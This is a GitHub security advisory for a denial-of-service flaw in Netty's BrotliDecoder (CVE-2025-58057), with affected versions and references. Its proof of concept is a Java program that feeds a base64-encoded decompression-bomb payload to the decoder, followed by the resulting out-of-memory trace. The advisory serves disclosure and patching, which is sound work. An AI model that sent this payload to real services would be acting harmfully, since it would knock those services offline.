# [M] Netty's decoders vulnerable to DoS via zip bomb style attack

## Summary
Severity: Medium
Advisory: GHSA-3p8m-j85q-pgmj
CVE: CVE-2025-58057
CWE: CWE-409
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-09-03
Source: https://github.com/advisories/GHSA-3p8m-j85q-pgmj
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-compression` — affected >=4.2.0.Alpha1 <4.2.5.Final
- Maven: `io.netty:netty-codec` — affected >=0 <4.1.125.Final

## Details
### Summary

With specially crafted input, `BrotliDecoder` and some other decompressing decoders will allocate a large number of reachable byte buffers, which can lead to denial of service.

### Details

`BrotliDecoder.decompress` has no limit in how often it calls `pull`, decompressing data 64K bytes at a time. The buffers are saved in the output list, and remain reachable until OOM is hit. This is basically a zip bomb.

Tested on 4.1.118, but there were no changes to the decoder since.

### PoC

Run this test case with `-Xmx1G`:

```java
import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;

import java.util.Base64;

public class T {
    public static void main(String[] args) {
        EmbeddedChannel channel = new EmbeddedChannel(new BrotliDecoder());
        channel.writeInbound(Unpooled.wrappedBuffer(Base64.getDecoder().decode("aPpxD1tETigSAGj6cQ8vRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROMBIAEgIaHwBETlQQVFcXlgA=")));
    }
}
```

Error:

```
Exception in thread "main" java.lang.OutOfMemoryError: Cannot reserve 4194304 bytes of direct buffer memory (allocated: 1069580289, limit: 1073741824)
	at java.base/java.nio.Bits.reserveMemory(Bits.java:178)
	at java.base/java.nio.DirectByteBuffer.<init>(DirectByteBuffer.java:121)
	at java.base/java.nio.ByteBuffer.allocateDirect(ByteBuffer.java:332)
	at io.netty.buffer.PoolArena$DirectArena.allocateDirect(PoolArena.java:718)
	at io.netty.buffer.PoolArena$DirectArena.newChunk(PoolArena.java:693)
	at io.netty.buffer.PoolArena.allocateNormal(PoolArena.java:213)
	at io.netty.buffer.PoolArena.tcacheAllocateNormal(PoolArena.java:195)
	at io.netty.buffer.PoolArena.allocate(PoolArena.java:137)
	at io.netty.buffer.PoolArena.allocate(PoolArena.java:127)
	at io.netty.buffer.PooledByteBufAllocator.newDirectBuffer(PooledByteBufAllocator.java:403)
	at io.netty.buffer.AbstractByteBufAllocator.directBuffer(AbstractByteBufAllocator.java:188)
	at io.netty.buffer.AbstractByteBufAllocator.directBuffer(AbstractByteBufAllocator.java:179)
	at io.netty.buffer.AbstractByteBufAllocator.buffer(AbstractByteBufAllocator.java:116)
	at io.netty.handler.codec.compression.BrotliDecoder.pull(BrotliDecoder.java:70)
	at io.netty.handler.codec.compression.BrotliDecoder.decompress(BrotliDecoder.java:101)
	at io.netty.handler.codec.compression.BrotliDecoder.decode(BrotliDecoder.java:137)
	at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:530)
	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:469)
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:290)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:444)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1357)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:868)
	at io.netty.channel.embedded.EmbeddedChannel.writeInbound(EmbeddedChannel.java:348)
	at io.netty.handler.codec.compression.T.main(T.java:11)
```

### Impact

DoS for anyone using `BrotliDecoder` on untrusted input.

## References
- https://github.com/netty/netty/security/advisories/GHSA-3p8m-j85q-pgmj
- https://nvd.nist.gov/vuln/detail/CVE-2025-58057
- https://github.com/netty/netty/commit/9d804c54ce962408ae6418255a83a13924f7145d
- https://github.com/netty/netty
